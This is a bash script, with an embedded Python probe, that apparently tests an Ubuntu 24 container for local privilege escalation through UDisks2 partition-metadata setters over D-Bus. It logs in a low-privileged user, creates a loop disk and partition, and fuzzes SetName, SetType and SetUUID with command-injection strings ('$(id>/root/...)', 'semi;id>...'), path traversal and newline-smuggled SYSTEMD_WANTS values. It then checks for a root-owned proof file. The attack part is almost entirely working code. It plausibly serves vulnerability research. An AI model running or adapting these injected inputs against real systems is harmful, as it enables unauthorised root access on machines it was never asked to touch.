#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'EOS'
set -Eeuo pipefail

name=active-udisks-partition-metadata
tmp="/tmp/$name"
home="/home/selfauth/$name"
root_marker="/root/${name}-root"
run_marker="/run/${name}-root"
tmp_marker="/tmp/${name}-root"
console=1

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  if [ -f "$tmp/loops" ]; then
    tac "$tmp/loops" 2>/dev/null | while read -r dev; do
      [ -n "$dev" ] && udisksctl loop-delete -b "$dev" --no-user-interaction >/dev/null 2>&1 || true
      [ -n "$dev" ] && losetup -d "$dev" >/dev/null 2>&1 || true
    done
  fi
  losetup -a | awk -F: '/active-udisks-partition-metadata/ {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  rm -rf "$home" "$tmp" "$root_marker" "$run_marker" "$tmp_marker"
  systemctl reset-failed udisks2.service systemd-udevd.service "getty@tty${console}.service" >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" "$tmp_marker"
mkdir -p "$tmp" "$home"
: >"$tmp/loops"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"
chown selfauth:selfauth "$tmp/loops"
chmod 0666 "$tmp/loops"

{
  echo "## target/default proof"
  sed -n "1,8p" /etc/os-release
  uname -a
  id attacker
  id selfauth
  echo

  echo "## default package versions"
  for pkg in udisks2 libudisks2-0 dbus polkitd systemd udev util-linux parted gdisk python3-dbus; do
    dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>&1 || true
  done | sort
  echo

  echo "## default service and policy"
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  systemctl cat udisks2.service 2>&1 | sed -n "1,80p"
  echo
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.loop-setup/,+70p'
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.modify-device"/,+70p'
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.modify-device-system/,+70p'
  echo

  echo "## method and udev evidence"
  grep -R -nE 'by-partlabel|by-partuuid|ID_PART_ENTRY|partlabel|partuuid' /usr/lib/udev/rules.d /usr/lib/systemd/system 2>/dev/null || true
  stat -Lc '%A %U:%G %n' \
    /usr/libexec/udisks2/udisksd \
    /usr/lib/udev/rules.d/60-persistent-storage.rules \
    /usr/lib/udev/rules.d/99-systemd.rules \
    /usr/bin/udisksctl \
    /usr/bin/gdbus \
    /usr/bin/python3 \
    /usr/sbin/parted \
    /usr/sbin/sgdisk 2>&1 || true
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.py" <<'PY'
#!/usr/bin/env python3
import os
import subprocess
import sys
import time

import dbus

BUS = "org.freedesktop.UDisks2"
ROOT = "/org/freedesktop/UDisks2"
MANAGER = "/org/freedesktop/UDisks2/Manager"
NAME = "active-udisks-partition-metadata"
WORK = f"/tmp/{NAME}"
HOME = f"/home/selfauth/{NAME}"
LOOPS = os.path.join(WORK, "loops")
OUT = os.path.join(WORK, "user.out")
ROOT_MARKER = f"/root/{NAME}-root"
RUN_MARKER = f"/run/{NAME}-root"
TMP_MARKER = f"/tmp/{NAME}-root"

LINUX_GUID = "0FC63DAF-8483-4772-8E79-3D69D8477DE4"
VALID_GUID = "11111111-2222-4333-8444-555555555555"

def vdict(d=None):
    out = dbus.Dictionary({}, signature="sv")
    for k, v in (d or {}).items():
        out[k] = v
    return out

def log(msg=""):
    print(msg, flush=True)

def sh(cmd, timeout=30):
    log(f"$ {cmd}")
    try:
        p = subprocess.run(cmd, shell=True, text=True, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=timeout)
        if p.stdout:
            log(p.stdout.rstrip())
        log(f"rc={p.returncode}")
        return p
    except Exception as exc:
        log(f"EXC {type(exc).__name__}: {exc}")
        return None

def iface(path, name):
    return dbus.Interface(bus.get_object(BUS, path), name)

def props(path, name):
    return dbus.Interface(bus.get_object(BUS, path), "org.freedesktop.DBus.Properties").GetAll(name)

def dev_from_block(path):
    try:
        block = props(path, "org.freedesktop.UDisks2.Block")
        raw = block.get("Device", b"")
        return bytes(raw).split(b"\0", 1)[0].decode("utf-8", "replace")
    except Exception as exc:
        return f"<dev-error:{type(exc).__name__}:{exc}>"

def find_partition(loop_path):
    managed = iface(ROOT, "org.freedesktop.DBus.ObjectManager").GetManagedObjects()
    candidates = []
    for path, ifaces in managed.items():
        part = ifaces.get("org.freedesktop.UDisks2.Partition")
        if not part:
            continue
        if str(part.get("Table")) == str(loop_path):
            candidates.append(str(path))
    if candidates:
        return sorted(candidates)[0]
    loop_dev = os.path.basename(dev_from_block(loop_path))
    for path, ifaces in managed.items():
        block = ifaces.get("org.freedesktop.UDisks2.Block")
        if not block:
            continue
        raw = bytes(block.get("Device", b"")).split(b"\0", 1)[0].decode("utf-8", "replace")
        if os.path.basename(raw).startswith(loop_dev + "p"):
            return str(path)
    return ""

def settle(label, part_obj=""):
    log(f"\n## settle after {label}")
    sh("udevadm settle --timeout=20 || true", timeout=25)
    if part_obj:
        dev = dev_from_block(part_obj)
        base = os.path.basename(dev) if dev.startswith("/dev/") else ""
        log(f"part_obj={part_obj} dev={dev}")
        try:
            part = props(part_obj, "org.freedesktop.UDisks2.Partition")
            log("partition_props " + " ".join(f"{k}={part.get(k)!r}" for k in sorted(part.keys())))
        except Exception as exc:
            log(f"partition_props_error {type(exc).__name__}: {exc}")
        if base:
            sh(f"ls -l /dev/{base} /sys/class/block/{base} 2>&1 || true")
            sh(f"udevadm info --query=property --name /dev/{base} 2>&1 | "
               "grep -E '^(DEVNAME|DEVLINKS|ID_PART|ID_FS|SYSTEMD|UDISKS)' | sort || true")
            sh(f"udevadm info --query=property --path /sys/class/block/{base} 2>&1 | "
               "grep -E '^(DEVNAME|DEVLINKS|ID_PART|ID_FS|SYSTEMD|UDISKS)' | sort || true")
    sh("find /dev/disk/by-partlabel /dev/disk/by-partuuid /dev/disk/by-label /dev/disk/by-uuid "
       "-maxdepth 1 -mindepth 1 -printf '%M %u:%g %p -> %l\\n' 2>/dev/null | sort | sed -n '1,220p'")
    sh(f"stat -Lc '%A %a %U:%G %n' {ROOT_MARKER} {RUN_MARKER} {TMP_MARKER} 2>&1 || true")

os.makedirs(WORK, exist_ok=True)
sys.stdout = open(OUT, "w", buffering=1)
sys.stderr = sys.stdout

log("## active selfauth session")
sh("id; tty; echo XDG_SESSION_ID=${XDG_SESSION_ID:-}; "
   "if [ -n \"${XDG_SESSION_ID:-}\" ]; then loginctl show-session \"$XDG_SESSION_ID\" "
   "-p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote; fi")

bus = dbus.SystemBus()
manager = iface(MANAGER, "org.freedesktop.UDisks2.Manager")

img = os.path.join(HOME, "partmeta.img")
log("\n## create active-user loop disk")
sh(f"truncate -s 96M {img}; ls -l {img}")
fd = os.open(img, os.O_RDWR | os.O_CLOEXEC)
try:
    loop_path = str(manager.LoopSetup(dbus.types.UnixFd(fd), vdict({"read-only": dbus.Boolean(False, variant_level=1)})))
finally:
    os.close(fd)
log(f"loop_path={loop_path}")
loop_dev = dev_from_block(loop_path)
log(f"loop_dev={loop_dev}")
with open(LOOPS, "a", encoding="utf-8") as f:
    if loop_dev.startswith("/dev/"):
        f.write(loop_dev + "\n")
settle("LoopSetup")

log("\n## Block.Format(gpt) and PartitionTable")
block = iface(loop_path, "org.freedesktop.UDisks2.Block")
try:
    res = block.Format("gpt", vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
    log(f"Format_gpt_OK {res!r}")
except Exception as exc:
    log(f"Format_gpt_ERR {type(exc).__name__}: {exc}")
settle("Format(gpt)")
sh(f"gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path {loop_path} | "
   "sed -n '/interface org.freedesktop.UDisks2.PartitionTable/,/};/p'")

pt = iface(loop_path, "org.freedesktop.UDisks2.PartitionTable")
part_obj = ""
try:
    res = pt.CreatePartition(dbus.UInt64(1048576), dbus.UInt64(16 * 1024 * 1024),
                             dbus.String(LINUX_GUID), dbus.String("SAFEPART"),
                             vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
    part_obj = str(res)
    log(f"CreatePartition_OK {part_obj}")
except Exception as exc:
    log(f"CreatePartition_ERR {type(exc).__name__}: {exc}")
    part_obj = find_partition(loop_path)
    log(f"CreatePartition_recovered_part_obj={part_obj}")
settle("CreatePartition", part_obj)

if not part_obj:
    log("NO_PARTITION_OBJECT; cannot exercise Partition setters on this target")
else:
    sh(f"gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path {part_obj} | "
       "sed -n '/interface org.freedesktop.UDisks2.Partition/,/};/p'")
    part = iface(part_obj, "org.freedesktop.UDisks2.Partition")

    log("\n## Partition.SetName matrix")
    names = [
        "SAFEPART2",
        "../../root/partpwn",
        "semi;id>/root/active-udisks-partition-metadata-root",
        "$(id>/root/active-udisks-partition-metadata-root)",
        "line\nSYSTEMD_WANTS=active-udisks-partition-metadata.service",
        "--attributes=1:set:2",
    ]
    for val in names:
        log(f"\n### SetName repr={val!r}")
        try:
            res = part.SetName(dbus.String(val), vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
            log(f"SetName_OK {res!r}")
        except Exception as exc:
            log(f"SetName_ERR {type(exc).__name__}: {exc}")
        settle(f"SetName {val!r}", part_obj)

    log("\n## Partition.SetType matrix")
    types = [
        LINUX_GUID,
        "21686148-6449-6E6F-744E-656564454649",
        "../../root/parttype",
        "semi;id>/root/active-udisks-partition-metadata-root",
        "$(id>/root/active-udisks-partition-metadata-root)",
        "11111111-2222-4333-8444-555555555555\nSYSTEMD_WANTS=x.service",
    ]
    for val in types:
        log(f"\n### SetType repr={val!r}")
        try:
            res = part.SetType(dbus.String(val), vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
            log(f"SetType_OK {res!r}")
        except Exception as exc:
            log(f"SetType_ERR {type(exc).__name__}: {exc}")
        settle(f"SetType {val!r}", part_obj)

    log("\n## Partition.SetUUID matrix")
    uuids = [
        VALID_GUID,
        "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee",
        "../../root/partuuid",
        "semi;id>/root/active-udisks-partition-metadata-root",
        "$(id>/root/active-udisks-partition-metadata-root)",
        "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee\nSYSTEMD_WANTS=x.service",
    ]
    for val in uuids:
        log(f"\n### SetUUID repr={val!r}")
        try:
            res = part.SetUUID(dbus.String(val), vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
            log(f"SetUUID_OK {res!r}")
        except Exception as exc:
            log(f"SetUUID_ERR {type(exc).__name__}: {exc}")
        settle(f"SetUUID {val!r}", part_obj)

    log("\n## Partition.SetFlags matrix")
    for val in [0, 1, 2, 4, 0x8000000000000000, 0xffffffffffffffff]:
        log(f"\n### SetFlags value=0x{val:016x}")
        try:
            res = part.SetFlags(dbus.UInt64(val), vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
            log(f"SetFlags_OK {res!r}")
        except Exception as exc:
            log(f"SetFlags_ERR {type(exc).__name__}: {exc}")
        settle(f"SetFlags 0x{val:016x}", part_obj)

log("\n## cleanup loop")
try:
    iface(loop_path, "org.freedesktop.UDisks2.Loop").Delete(vdict({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}))
    log("Loop.Delete_OK")
except Exception as exc:
    log(f"Loop.Delete_ERR {type(exc).__name__}: {exc}")
PY

chmod 0755 "$home/probe.py"
chown -R selfauth:selfauth "$home"
cat >"/home/selfauth/.bash_profile" <<SH
python3 "$home/probe.py"
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop "getty@tty${console}.service" >/dev/null 2>&1 || true
timeout 300 openvt -c "$console" -s -f -w -- /bin/login -f selfauth || true
systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 >/dev/null 2>&1 || true

cat "$tmp/root-prep.out"
echo
cat "$tmp/user.out" 2>&1 || true
echo
echo "## root-side postcheck"
for p in "$root_marker" "$run_marker" "$tmp_marker"; do
  if [ -e "$p" ]; then
    echo "ROOT_MARKER_PRESENT $p"
    stat -Lc '%A %a %U:%G %n' "$p"
    cat "$p"
  else
    echo "ROOT_MARKER_ABSENT $p"
  fi
done
echo
echo "## root-side device state"
find /dev/disk/by-partlabel /dev/disk/by-partuuid -maxdepth 1 -mindepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
losetup -a | grep "$name" || true
echo
echo "## recent relevant journal"
journalctl -b --no-pager -u udisks2.service -u systemd-udevd.service \
  -g 'active-udisks-partition-metadata|SetName|SetType|SetUUID|SetFlags|partlabel|partuuid|sgdisk|parted|NotAuthorized|Invalid' -n 220 2>&1 || true
echo
echo "## cleanup-health"
systemctl is-system-running || true
systemctl --failed --no-legend | wc -l
echo
echo "## result"
if [ -e "$root_marker" ]; then
  echo "ROOT_PROOF=YES"
  id
else
  echo "ROOT_PROOF=NO"
fi
EOS
